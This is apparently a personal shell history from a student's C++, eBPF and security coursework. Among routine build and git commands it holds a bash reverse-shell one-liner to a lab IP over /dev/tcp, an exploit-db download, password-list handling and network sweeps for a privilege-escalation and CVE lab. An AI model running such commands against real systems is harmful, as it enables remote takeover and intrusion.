+cppcompile lab8check -d
+git status
+git diff CMakeLists.txt
+cppcompile lab8check -d
+ls cmake
+cppbuild lab9check
+v project.Dockerfile
+cppbuild lab9check
+cppcompile lab9check -d
+ls
+cppcompile lab9check -d
+cpprun lab9check ls
+cpprun lab9check cd cmake-build-debug
+cpprun lab9check cd cmake-build-debug; ls
+cpprun lab9check 'cd cmake-build-debug; ls'
+cpprun lab9check sh -c 'cd cmake-build-debug; ls'
+cpprun lab9check sh -c 'cd cmake-build-debug && ls'
+cpprun lab9check bash
+git diff
+git status
+ls TBB
+\rm -r include/tbb include/oneapi lib64 share 
+git status
+cppcompile lab9check -d
+ls -1
+ls -R
+ls
+./compile.sh -d
+./compile.sh -c
+./compile.sh -d
+ls
+ls cmake-build-debug
+cd cmake-build-debug
+cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=.. ..
+cd ..
+ls
+\rm CMakeCache.txt
+cppcompile lab9check -d
+cpprun lab8check cmake --build cmake-build-debug --parallel 9
+cpprun lab8check ./bin/countwords_par cfg1.conf
+cpprun lab8check cmake --build cmake-build-debug --parallel 9
+cpprun lab8check ./bin/countwords_par cfg1.conf
+cpprun lab8check ./cmake-build-debug/countwords_par cfg1.conf
+./cmake-build-debug/countwords_par cfg1.conf
+cpprun lab8check ls __tests__
+v cfg1.conf
+cpprun lab8check python test_words.py parallel -b cmake-build-debug
+cpprun lab8check python test_words.py parallel -b cmake-build-debug
+cpprun lab8check cmake --build cmake-build-debug --parallel 9
+v test_words.py
+cpprun lab8check bash -c 'cd cmake-build-debug && cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=.. ..'
+\rm -r cmake-build-debug/* CMakeCache.txt
+cpprun lab8check bash -c 'cd cmake-build-debug && cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=.. ..'
+ls
+\rm -r cmake-build-debug/* CMakeCache.txt
+ls
+\rm -f CMakeCache.txt
+ls
+ls cmake-build-debug
+cpprun lab8check bash -c 'cd cmake-build-debug && cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=.. ..'
+cpprun lab8check bash
+cpprun lab8check cmake --build cmake-build-debug --parallel 9
+cpprun lab8check python test_words.py parallel -b cmake-build-debug
+cpprun lab8check ./cmake-build-debug/countwords_par cfg1.conf
+cat a
+cat n
+v src/main_tbb.cpp
+j sec
+ls
+v gvm_password.txt
+j sec
+ls
+mkdir lab4-openvas
+cd lab4-openvas
+ls
+v README.md
+v README.md
+python
+curl https://www.exploit-db.com/download/41987 | wl-copy
+ls
+v README.md
+v README.md
+license
+git init
+git add .
+git commit -m "Complete what I can"
+git push --set-upstream git@github.com:rhusiev-student/s6_sec_lab4.git main
+v README.md
+git add .
+git commit -m "Reword so that it's clear that it's just the openvas I did not manage to do"
+git push
+j pri
+ssh -i id_ed25519 dedicated_persevere@185.130.46.132
+j sec
+ls
+cd lab4-openvas
+git pull --set-upstream git@github.com:rhusiev-student/s6_sec_lab4_2.git
+cd ..
+mv lab4-openvas lab4-2-openvas
+ls
+git clone git@github.com:rhusiev-student/s6_sec_lab4_1.git lab4-1-priv-escalation
+cd lab4-1-priv-escalation
+ls
+cd /large/virt
+ls
+\rm alpline-lab4-hackable-3.ova
+tar -xvf alpline-lab4-hackable-1.ova
+qemu-img convert -f vmdk -O raw alpline-lab4-hackable-1-disk001.vmdk alpine-hackable-4.img
+ls
+j sec
+ls
+fd pass
+cp lab3-stackoverflow/test/passwd.txt lab4-1-priv-escalation
+cd lab4-1-priv-escalation
+ls
+v passwd.txt
+ls ..
+\rm passwd.txt
+ls
+v 10-million-password-list-top-100000.txt
+v 10-million-password-list-top-100000.txt
+\rm 10-million-password-list-top-100000.txt
+ls
+v README.md
+ls
+o .
+v README.md
+git add .
+git commit -m "Add results"
+git push
+o .
+о сзз
+j cpp
+ls
+mkdir lab5-the-game
+cd lab5-the-game
+cppproj
+v README.md
+ls
+v CMakeLists.txt
+v src/game.cpp
+mv src/game.cpp src/the_game.cpp
+touch include/the_game.hpp
+v include/the_game.hpp
+./compile.sh -d
+v src/main.cpp
+./compile.sh -d
+cpplsp
+v src/the_game.cpp
+cd ../lab4-algorithms-rhusiev
+v .git/config
+cd ../lab3-my-vector-opyr_zaletskyi_husiev-1
+v .git/config
+cd ..
+git clone https://github.com/ucu-cs/lab5-tic-tac-toe-_-zaletskyi-_-husiev-_
+git clone git@github.com:ucu-cs/lab5-tic-tac-toe-_-zaletskyi-_-husiev-_.git
+cd lab5-tic-tac-toe-_-zaletskyi-_-husiev-_
+la
+\rm -r .github *
+cp ../lab5-the-game/* .
+cp ../lab5-the-game/* . -r
+cp ../lab5-the-game/.gitignore . -r
+git status
+ls
+v CMakeLists.txt
+git add .
+git commit -m "Add a basic board"
+git push
+cd ..
+trash lab5-the-game
+cd lab5-tic-tac-toe-_-zaletskyi-_-husiev-_
+cd -
+mv lab5-tic-tac-toe-_-zaletskyi-_-husiev-_ lab5-the-game
+cd lab5-the-game
+ls
+v src/main.cpp
+git add .
+git commit -m "Change from uint8_t to size_t for array size"
+git push
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+cpplsp
+./compile.sh -d
+./compile.sh -d
+./bin/the_game
+git diff
+git add .
+git commit -m "Move to std::expected"
+git push
+./compile.sh -d
+./compile.sh -d
+./compile.sh -d
+./bin/the_game
+j cpp
+ls
+cd lab1-ratio-zaletskyi_husiev
+ls
+v src/QTheStubborn.cpp
+./compile.sh -d
+v src/QTheStubborn.cpp
+./bin/the_game
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+git status
+git diff
+git add .
+git commit -m "Add a simple game with ai"
+git push
+./bin/the_game
+./bin/the_game
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+git add .
+git commit -m "Add better user error handling"
+git push
+git diff HEAD~1
+j sec
+ls
+git clone git@github.com:rhusiev-student/s6_sec_lab5.git
+ls lab4-1-priv-escalation
+ls lab4-2-openvas
+\rm lab4-1-priv-escalation/lab4-1-priv-escalation.zip
+ls lab3-stackoverflow
+cp lab4-2-openvas/LICENSE.md lab4-1-priv-escalation
+cd lab4-1-priv-escalation
+git add .
+git commit -m "Add license"
+git push
+cd ../lab5
+cd ..
+ls
+mv s6_sec_lab5 lab5-chr-again
+cd lab5-chr-again
+ls
+la
+cp ../lab4-2-openvas/LICENSE.md .
+mkdir img
+o img
+cp ../lab1-chr/common ../lab1-chr/poc . -r
+ls
+cd poc
+ls
+mv cve_2019_3924/* .
+ls
+\rm cve_2019_3924
+\rm cve_2019_3924 -r
+ls
+v CMakeLists.txt
+\rm src/main_original.cpp
+v src/main.cpp
+v README.md
+v ../../lab4-1-priv-escalation/README.md
+v README.md
+ls
+ls ..
+mv README.md ..
+ls ..
+ls
+ls ..
+v ../top5-users.txt
+v ../top5-users.txt
+mv ../top5-users.txt ../top6-users.txt
+ls
+cd ..
+v filter_long_passwords.py
+v filtered-password-list.txt
+ls
+v 10k-password-list.txt
+mv 10k-password-list.txt 1k-password-list.txt
+v filter_long_passwords.py
+v filter_long_passwords.py
+v top6-users.txt
+v 1k-password-list.txt
+mv 1k-password-list.txt 10k-password-list.txt
+v 10k-password-list.txt
+v filter_long_passwords.py
+ls
+v credentials.txt
+shai mount example.img to /mnt
+mount -o loop beagle-debian.img /mnt
+shai mount beagle-debian.img to /mnt
+shai setup and mount beagle-debian.img to /mnt
+ls
+losetup --find --show beagle-debian.img
+sudo losetup --find --show beagle-debian.img
+lsblk
+mount /dev/loop0 /mnt
+sudo mount /dev/loop0 /mnt
+sudo fdisk -l /dev/loop0
+sudo partprobe /dev/loop0
+lsblk
+mkdir /mnt/part1
+sudo mkdir /mnt/part1
+sudo mkdir /mnt/part2
+sudo mkdir /mnt/part3
+sudo mount /dev/loop0p1 /mnt/part1
+sudo mount /dev/loop0p2 /mnt/part2
+sudo mount /dev/loop0p3 /mnt/part3
+ranger /mnt
+sudoedit /mnt/part1/sysconf.txt
+sudo umount /mnt/part1
+sudo umount /mnt/part2
+sudo umount /mnt/part3
+ranger /mnt
+\rm -r /mnt/*
+sudo rm -r /mnt/*
+cp ~/Templates/cpp_template/gitignore ~/Templates/cpp_template/LICENSE.md .
+ls
+mv gitignore .gitignore
+v .gitignore
+v .gitignore
+v hello-world/hello-world.bpf.c
+git init
+cd ..
+mv tssssh-pa tssssh-opa
+cd tssssh-opa
+ls
+mv tssssh-pa tssssh-opa
+fd tssssh-pa
+rg tssssh-pa
+git add .
+git commit -m "Initial commit (with some Petro's stuff)"
+git push --set-upstream git@github.com:rhusiev/tssssh-opa.git main
+v README.md
+git add .
+git commit -m "Add a little readme"
+git push
+v tssssh-opa/custom_data.c
+j sec
+ls
+cd tssssh-opa
+ls
+git checkout -b xdp
+ls
+cd tssssh-opa
+ls
+v rsa.c
+ls
+mkdir ../rsa
+mv * ../rsa
+v xdp-tcpdump.bpf.c
+v xdp-tcpdump.c
+v Makefile
+v Makefile
+cd ..
+git submodule add https://github.com/libbpf/blazesym.git vmlinux/blazesym
+git submodule add https://github.com/libbpf/bpftool.git vmlinux/bpftool
+cd vmlinux
+ln -h
+ln --help
+tldr ln
+mv vmlinux third-party
+la
+cd ..
+cd -
+mv third-party vmlinux
+cd ..
+mv vmlinux third-party
+la
+v .gitmodules
+ls
+cd third-party
+ls
+ln -s bpftool/libbpf libbpf
+ls
+cd ..
+ls
+cd tssssh-opa
+make
+v Makefile
+cd -
+mv third-party third_party
+rg vmlinux
+rg vmlinux/
+v .gitmodules
+ls
+cd t
+cd tssssh-opa
+ls
+make
+ls ../third_party/libbpf/
+cd ..
+ls
+cd third_party
+ls
+ls libbpf
+ls bpftool/libbpf
+cd bpftool
+ls
+git pull --recurse-submodules
+cd ..
+git submodule update --init --recursive
+cd -
+ls
+cd ..
+ls
+\rm blazesym bpftool
+\rm blazesym bpftool -r
+cd ..
+git submodule add https://github.com/libbpf/bpftool.git vmlinux/bpftool
+git submodule add https://github.com/libbpf/bpftool.git third_party/bpftool
+git submodule add https://github.com/libbpf/blazesym.git third_party/blazesym
+git submodule update --init --recursive
+v .gitmodules
+rg vmlinux
+rg "vmlinux/"
+la
+git submodule deinit third_party/bpftool
+git submodule deinit third_party/bpftool -f
+git submodule deinit third_party/bpftool --force
+git submodule deinit --force third_party/bpftool
+git submodule deinit --force third_party/blazesym
+\rm -r third_party/b*
+git submodule add https://github.com/libbpf/blazesym.git third_party/blazesym
+ls
+v .gitmodules
+\rm .gitmodules
+ls third_party
+git submodule add https://github.com/libbpf/blazesym.git third_party/blazesym
+ls
+git status
+la
+fd .gitmodules
+fd gitmodules
+cp third_party tssssh-opa rsa ..
+cp third_party tssssh-opa rsa .. -r
+git reset --hard
+git status
+cp ../third_party ../rsa ../tssssh-opa . -r
+\rm tssssh-opa rsa third_party -r
+cp ../third_party ../rsa ../tssssh-opa . -r
+\rm tssssh-opa rsa third_party -r
+\rm tssssh-opa rsa third_party -rf
+cp ../tssssh-opa ./tssssh-opa/ -r
+ls
+\rm -r tssssh-opa
+\rm -fr tssssh-opa
+ls
+mkdir tssssh-opa
+mv xdp-tcpdump.* Makefile tssssh-opa
+la
+mv ../rsa ../third_party .
+ls
+la third_party
+git submodule add https://github.com/libbpf/blazesym.git third_party/blazesym
+la .output
+\rm .output -r
+la third_party
+git submodule add https://github.com/libbpf/blazesym.git third_party/blazesym
+fd blaze
+rg blaze
+rg blaze -i
+rg blaze -.
+cp third_party rsa tssssh-opa ../.. -r
+git reset --hard
+git status
+\rm -r rsa third_party tssssh-opa/*
+git status
+git reset --hard
+cp ../../third_party ../../tssssh-opa ../../rsa . -r
+ls tssssh-opa
+\rm tssssh-opa/rsa* tssssh-opa/primes.txt tssssh-opa/custom_data.c
+ls tssssh-opa
+git submodule add https://github.com/libbpf/blazesym.git third_party/blazesym
+rg blaze -.
+v .git/config
+\rm .git/modules/ -r
+\rm .git/modules/ -rf
+rg blaze -.
+rg libbpf -.
+git submodule add https://github.com/libbpf/blazesym.git third_party/blazesym
+git submodule add https://github.com/libbpf/bpftool.git third_party/bpftool
+git submodule update --init --recursive
+ls
+cd third_party
+ls
+ln -s bpftool/libbpf libbpf
+cd ..
+git add .
+git commit -m "Add third party stuff"
+cd tssssh-opa
+make
+ls
+la
+\rm .output
+\rm .output -r
+la ..
+cd ..
+git push
+git push xdp
+git push origin xdp
+git push git@github.com:rhusiev/tssssh-opa.git xdp
+shai run \`make\`, but with C compiler clang
+shai run \`make\`, but with C compiler clang
+v README.md
+rg gcc
+ls
+ranger third_party/vmlinux
+cd third_party/vmlinux
+ls
+cd x86
+ls
+\rm vmlinux.h
+ln vmlinux_601.h vmlinux.h
+git status
+cd ../../..
+ls
+v .gitignore
+git status
+git add .
+v .gitignore
+v .gitignore
+git commit -m "It compiles
+git commit -m "It compiles\!"
+git push
+git push git@github.com:rhusiev/tssssh-opa.git xdp
+j src
+j sec
+ls
+cd tssssh-opa
+ls
+ls tssssh-opa
+j acs
+ls
+cd lab8-words-parallel
+la
+o efficiency.gif
+v draw.py
+rg efficiency.gif
+rg efficiency
+rg gif
+v draw.py
+v run.py
+v find_parallelization_efficiency.py
+j sec
+ks
+ls
+cd tssssh-opa
+ls
+ls
+cd third_party
+ls
+v vmlinux/x86/vmlinux.h
+cd ..
+ls
+cd -
+v LICENSE
+cd ..
+git add .
+git commit -m "Add license for third_party"
+ls
+v tssssh-opa/xdp-tcpdump.
+v tssssh-opa/xdp-tcpdump.c
+git push
+git push git@github.com:rhusiev/tssssh-opa.git xdp
+git checkout main
+git checkout xdp
+git checkout main
+git pull
+ls tssssh-opa
+git merge -h
+tldr git merge
+git merge xdp
+ls tssssh-opa
+ls tssssh-opa/src
+ls tssssh-opa/src/client
+ls tssssh-opa
+v tssssh-opa/src/test_server/server.c
+mkdir smart-client
+mkdir unknowing-server
+mv tssssh-opa/src/client/* smart-client
+mv smart-client smart_client
+mv unknowing-server unknowing_server
+mv tssssh-opa/src/test_server/server.c unknowing_server
+trash tssssh-opa/src/client tssssh-opa/src/test_server
+ls tssssh-opa/src
+ls tssssh-opa
+mkdir aes
+mv tssssh-opa/include ./aes/include
+mv tssssh-opa/src/aes.c aes
+ls tssssh-opa
+ls tssssh-opa/src
+\rm tssssh-opa/src -r
+ls
+v smart_client/client.c
+v unknowing_server/server.c
+ls
+ls tssssh-opa
+git status
+ls rsa
+git add .
+git status
+v .gitmodules
+ls third_party/bpftool
+git commit
+git push
+ls
+v LICENSE.md
+git add .
+git commit -m "Add other people to license and also BBQ"
+git push
+git pull
+git push
+ls
+cd tssssh-opa
+ls
+mv ../ecc ../ecli .
+v ../.git
+v ../.gitignore
+ls
+v xdp-tcpdump.c
+tree
+cd ..
+tree
+ranger
+ls
+o .
+mv tssssh-opa/ec* .
+ls
+ду�
+ls
+cd tssssh-opa
+ls
+v xdp-tcpdump.c
+j sec
+ls
+cd tssssh-opa
+ls
+cd aes
+ls
+cd ..
+cd smart_client
+ls
+v client.c
+\rm xdp-tcpdump_old.c
+v knowing_client.c
+mv xdp-tcpdump.c xdp-tcpdump_orig.c
+mv xdp-tcpdump_orig.c xdp-tcpdump.c
+ls
+mv xdp-tcpdump.bpf.c xdp-firewall.bpf.c
+ls
+\rm xdp-tcpdump
+ls
+v xdp-firewall.c
+v Makefile
+v xdp-firewall.
+v xdp-firewall.bpf.c
+v xdp-firewall.c
+\rm knowing_client.c
+v sender.c
+mv sender.c packet_sender.c
+v Makefile
+ls
+cd ..
+ls
+ls smart_client
+ls unknowing_server
+v smart_client/client.c
+cd -
+ls
+v test.sh
+ls
+clang packet_sender.c -Wall -g -O2 -o packet_sender -lbpf
+clang packet_sender.c -Wall -g -O2 -o packet_sender
+ls
+\rm packet_sender
+v test.sh
+v Makefile
+ls
+v Makefile
+trash packet_sender.c packet_sender xdp-firewall.c
+ls
+\rm xdp-firewall
+ls
+\rm test.sh
+ls
+v xdp-firewall.c
+v xdp-firewall.h
+v packet_sender.cpp
+v packet_sender.c
+v test_script.sh
+ls
+trash xdp-tcpdump.c
+v xdp-firewall.c
+git status
+v ../.gitignore
+v ../.gitignore
+git add .
+git add ..
+git status
+git commit -m "Add an xdp that filters by password (plaintext)"
+git push
+cd ..
+cd ..
+mv tssssh-opa tss-opa
+cd tss-opa
+ls
+mv tssssh-opa tss-opa
+v README.md
+rg tssssh
+git status
+git add .
+git commit -m "Change tssssh-opa to tss-opa (because we don't do just ssh)"
+git push
+cd tss-opa
+ls
+cd ..
+ls
+ls smart_client
+ls
+v smart_client/client.c
+ls t
+ls tss-opa
+v tss-opa/Makefile
+ls
+ls
+git status
+v tss-opa/Makefile
+v .gitignore
+git status
+cd tss-opa
+ls
+cd ..
+ls
+mkdir password_packet_sender
+mv tss-opa/packet_sender* password_packet_sender
+ls tss-opa
+mv tss-opa/test_script.sh .
+ls
+ls password_packet_sender
+\rm password_packet_sender/packet_sender
+v password_packet_sender/Makefile
+v tss-opa/xdp-firewall.c
+trash tss-opa/xdp-firewall.h
+ls include
+v password_packet_sender
+v test_script.sh
+git status
+git add .
+git commit -m "Make dir structure nicer"
+git push
+ls
+mkdir tests
+mv unknowing_server smart_client hello-world tests
+ls
+mv ecc ecli bin
+ls
+v test_script.sh
+v tss-opa/Makefile
+mv rsa tests/
+ls test
+ls tests
+ls
+mv aes tests
+ls tests
+git add .
+git commit -m "Move prev stuff to tests"
+git push
+ls
+ls
+j tss-opa
+ls
+v tss-opa/xdp-firewall.bpf.c
+ls
+v test_script.sh
+ls
+j ass
+ls
+python UCU_autotests/general/randomize.py words_teams.txt
+j tss-
+ls
+cd tss-opa
+ls
+make
+\rm build -r
+make
+ls
+\rm build -r
+ls
+ls ..
+ls
+cd ..
+v .gitignore
+cd tss-opa
+ls
+v Makefile
+ls
+cd ..
+ls
+ranger
+cd third_party
+ls
+cd ..
+rg vmlinux/
+rg /vmlinux
+ls
+cd third_party
+ls
+ls vmlinux
+cd ..
+v .gitignore
+git add .
+git commit -m "Remove x86 from gitignore"
+git push
+git pull --rebase
+git push
+cd Arduino/Projects
+ls
+cd s6_uv_lab6
+ls
+git add .
+git commit -m "Improve as much as possible for non-PID"
+git push
+cd Arduino/Projects
+ls
+cd s6_uv_lab6
+git add .
+git commit -m "Make tracking line and especially tracking station pretty good"
+git push
+git clone git@github.com:ucu-cs/lab8-words-count-parallel-koval__sirska.git
+ls
+cd lab8-words-count-parallel-koval__sirska
+ls
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+python test_words.py parallel -h
+python test_words.py parallel -C -s
+ls
+cd cmake-build-tests
+ls
+make
+cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=.. ..
+cd ..
+./compile.sh -c
+ls
+cpprun lab8check python test_words.py parallel -C -s
+gdb
+git diff
+git add .
+git commit -m "Check for station using solid line before it instead of timeout"
+git push
+git add .
+git commit -m "The best so far"
+git push
+cd Arduino/Projects/s6_uv_lab6
+git diff
+git add .
+git commit -m "Make code not dependent on base speed"
+git push
+git add .
+git commit -m "Set speed to 1200"
+git push
+cd Arduino/Projects/s6_uv_lab6
+cd ..
+\rm s6_uv_lab6.zip
+cd Arduino/Projects/s6_uv_lab6
+git reset --hard
+j cpp
+ls
+cd lab5-the-game
+git pull
+glog
+git diff d9d0ddb
+v src/ai_the_based.cpp
+git diff d9d0ddb
+ls
+ls include
+v include/the_game.hpp
+git add .
+git commit -m "Prettify check_winning_move"
+git push
+v include/the_game.hpp
+./compile.sh -d
+v src/the_game.cpp
+./compile.sh -d
+v src/the_game.cpp
+./compile.sh -d
+v src/main.cpp
+./compile.sh -d
+./compile.sh -d
+./bin/the_game
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./bin/the_game
+./compile.sh -d
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./bin/the_game
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+./compile.sh -d
+./bin/the_game
+git add .
+git commit -m "Abstract a generic player"
+git push
+git pull --rebase
+git push
+ls src
+ls include
+git clone git@github.com:ucu-cs/lab7-words-count-unicode-bilyi_______kyrylova.git
+cd lab7-words-count-unicode-bilyi_______kyrylova
+ls
+v CMakeLists.txt
+j cpp-
+ls
+v CMakeLists.txt
+./compile.sh -d
+sudo dnf install libarchive-devel
+./compile.sh -d
+ls
+cd ..
+\rm -r lab7-words-count-unicode-bilyi_______kyrylova
+\rm -fr lab7-words-count-unicode-bilyi_______kyrylova
+j sec
+ls
+cd lab5-chr-again
+ls
+v README.md
+o img/0_dhcp_chr.png
+j sec
+cd lab5-chr-again
+ls
+o .
+v README.md
+ls
+j lab5
+ls
+cd poc
+ls
+cd src
+ls
+v main.cpp
+j lab5
+cd poc/src
+ls
+v main.cpp
+j lab5
+cd ../build
+v passwords.txt
+o .
+ls
+v credentials.txt
+ls
+mkdir data
+v README.md
+cp top6-users.txt 10k-password-list.txt chr_config.txt credentials.txt filter* data
+ls 
+trash top6-users.txt 10k-password-list.txt chr_config.txt credentials.txt filter*
+ls
+ls
+ls data
+mkdir created_data
+mv data data_used
+mv data_used/test.php data_used/filter* created_data
+ls data_used
+mv data_used/chr_config.txt created_data
+mv data_used got_data
+ls got_data
+ls created_data
+v created_data/a.php
+cp created_data/test.php created_data/a.php
+v created_data/a.php
+\rm created_data/a.php
+v tm
+ls
+v poc/build/tmp.txt
+mv poc/build/tmp.txt poc/build/tmp.php
+v poc/build/tmp.php
+bash -i >& /dev/tcp/192.168.69.253/1337 0>&1
+ls /dev/tcp
+trash poc/build/tmp.php
+git status
+killall kdeconnectd
+ls
+mv ATTACKER.pcap got_data
+ls created_data
+ls got_data
+mkdir data
+mv got_data/* created_data/* data/
+trash got_data created_data
+ls data
+git add .
+git status
+git status poc
+git status poc/
+git status poc/*
+v .gitignore
+git add .
+git status
+git commit -m "Add all the data"
+git push
+j lab5
+ls
+v README.md
+j lab1
+ls
+v README.md
+j lab1
+j sec
+cd lab1-chr
+ls
+v README.md
+v README.md
+git add ,
+git add .
+git commit -m "Add a pretty good readme"
+o .
+v README.md
+git add .
+git commit --amend
+git push
+v poc/src/main.cpp
+j sec
+cd lab5
+cd lab5-chr-again
+ls
+v README.md
+cat Downloads/beekeeb_piantor_pro_rad1an.json | head 40
+cat Downloads/beekeeb_piantor_pro_rad1an.json | head
+cat Downloads/beekeeb_piantor_pro_rad1an.json | head -h
+cat Downloads/beekeeb_piantor_pro_rad1an.json | head --help
+git add .
+git commit -m "Add extra tasks"
+git push
+j ucu
+ls
+j ucu
+ls
+cd mmml
+ls
+mkdir labs
+mv Husiev_Kovalchuk_MMML_Lab1.ipynb newton.gif sgd.gif winequality-red.csv X.csv y.csv labs
+ls
+git clone git@github.com:katjakovalchuk/Project_MMML_Kovalcuk_Husiev.git project
+cd project
+ls
+mkdir src
+v src/main.py
+\rm src -r
+j la
+j ucu
+cd la
+ls
+j ucu
+cd la
+ls
+cd pefts
+ls
+v pefts/layers/lora.py
+ls
+ls Downloads
+cd Downloads
+unzip radyk.zip
+ls
+\rm radyk.zip
+cd lab10-words-count-high-level-tools-korets_tserkovna_kotliarchuk__
+o .
+cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+git clone git@github.com:uxlfoundation/oneTBB.git TBB
+./compile.sh -d
+ls
+./compile.sh -c
+python test_words.py -h
+python test_words.py tools -C -s
+python test_words.py tools -C -s -t -1
+python test_words.py tools -C -s -t 10000000
+python test_words.py tools -C -s -t 1000000
+j autot
+j words
+j words
+v test_words.py
+cd ..
+ls
+v src/main_tbb.cpp
+v src/main_tbb.cpp
+sudo dnf remove libarchive-devel
+ls
+mkdir build
+cd build
+cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=.. ..
+cmake --build .
+cd ..
+\rm -r build
+v CMakeLists.txt
+ls
+v CMakeLists.txt
+ls include
+v src/main_tbb.cpp
+v src/main_tbb.cpp
+v cfg/conf.cfg
+cd cmake-build-tests
+./countwords_par_proftools ../cfg/conf.cfg
+ls
+v out_by_a.txt 
+v out_by_n.txt 
+v ../cfg/conf
+v ../cfg/conf.cfg
+./countwords_par_proftools ../cfg/conf.cfg
+cat out_by_a.txt
+cat out_by_n.txt
+ls ../testing_dirs/test1
+./countwords_par_proftools ../cfg/conf.cfg
+cat out_by_n.txt
+cat out_by_a.txt
+v ../cfg/conf.cfg
+cd ..
+python test_words.py tools -C -s -t 1000000
+v CMakeLists.txt
+j mpi
+j mpi
+j acs
+ls
+cd lab11-mpi-opyr-husiev
+ls
+v config.cfg
+j lab5
+v README.md
+j lab5
+v README.md
+update
+flatpak --user update -y && flatpak update -y && tldr --update
+sudo dnf update -y
+j pri
+ssh -i id_ed25519 dedicated_persevere@185.130.46.132
+j sec
+ls
+cd tss-opa
+ls
+git pull
+ls
+git status
+v .gitignore
+ls tssssh-opa
+ls tss-opa
+diff tss-opa/Makefile tssssh-opa/Makefile
+\rm tssssh-opa
+\rm tssssh-opa -r
+glog
+git diff 8718987
+ls
+ls password_packet_sender
+v ../../../../.sync-exclude.lst
+v ../../../../.sync-exclude.lst
+v ../.sync-exclude.lst
+ls
+ls
+git log
+xzcat /large/virt/beagle-debian.img.xz | sudo dd of=/dev/sdb bs=64k oflag=dsync status=progress
+fd uEnv.txt
+fd uEnv.txt
+fd uEnv.txt
+fd uEnv.txt
+ls /virt
+ls /large/virt
+sha256sum /large/virt/beagle-debian.img.xz
+\rm /large/virt/bbai64-debian-12.9-minimal-arm64-2025-03-05-8gb.img.xz.sha256sum
+sudo parted -s /dev/sdb resizepart 2 '100%'
+sudo parted -s /dev/sdb resizepart 3 '100%'
+e2fsck -f /dev/sdb3
+sudo e2fsck -f /dev/sdb3
+resize2fs /dev/sdb3
+sudo resize2fs /dev/sdb3
+ls /dev/tty*
+ls /dev/usb*
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+j lab7
+ls
+v compile
+v compile.sh
+j cpp-c
+v Cm
+v CMakeLists.txt
+j cpp-c
+v CMakeLists.txt
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+ls -l /dev/ttyUSB*
+screen /dev/ttyUSB0 115200
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 115200
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+screen /dev/ttyUSB0 9600
+killall screen
+screen /dev/ttyUSB0 9600
+lsusb
+killall screen
+screen /dev/ttyUSB0 9600
+ip a
+ip a
+ip a
+shai find all ips on 10.10.229.168/8
+nmap -sP 10.0.0.0/8
+nmap -sP 10.10.0.0/16
+sudo arp-scan 10.10.0.0/24
+sudo dnf remove nmap
+sudo dnf install arp-scan
+sudo arp-scan 10.10.0.0/24
+sudo arp-scan 10.10.0.0/16
+sudo arp-scan 10.10.0.0/16 --interface=wlo1
+ssh beagle@10.10.224.2
+ssh beagle@10.10.224.2
+ssh beagle@10.10.224.2
+sudo ip route add 10.10.224.2/32 dev wlo1
+ssh beagle@10.10.224.2
+ip addr show dev wlo1
+ping -c 4 10.10.224.2
+ping -c 4 10.10.224.2
+sudo arp-scan 10.10.0.0/21 --interface=wlo1
+sudo arp-scan 10.10.229.168/21 --interface=wlo1
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ду�идл
+lsblk
+ls
+xzcat /large/virt/beagle-debian.img.xz | sudo dd of=/dev/sdb bs=64k oflag=dsync status=progress
+ls /large/virt
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+cd Downloads
+git clone git@github.com:ucu-cs/lab6-1brc-korets_tserkovna_kotliarchuk___.git
+cd lab6-1brc-korets_tserkovna_kotliarchuk___
+ls
+mkdir build
+cd build
+cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=.. ..
+cmake --build .
+cd ..
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/1brc/test_1brc.py .
+python test_1brc.py -h
+python test_1brc.py -C -s
+python test_1brc.py -C -s
+v test_1brc.py
+python test_1brc.py -C -s
+python test_1brc.py -h
